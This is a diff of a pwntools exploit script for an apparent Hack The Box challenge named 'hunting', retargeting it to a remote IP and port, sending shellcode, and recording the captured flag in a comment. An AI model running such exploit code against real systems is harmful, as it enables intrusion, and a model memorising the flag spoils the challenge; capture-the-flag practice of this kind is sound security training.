@@ -16,9 +16,9 @@ from pwn import *
 context.arch = 'i386'
 context.log_level = 'debug'
 
-io = process('./hunting')
-#ip, port = 
-#io = remote(ip, port)
+#io = process('./hunting')
+ip, port = '142.93.37.0', 30875
+io = remote(ip, port)
 
 '''
 objdump -d sc|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
@@ -30,3 +30,5 @@ print len(sc)
 
 io.sendline(sc)
 print io.recvall()
+
+#HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}
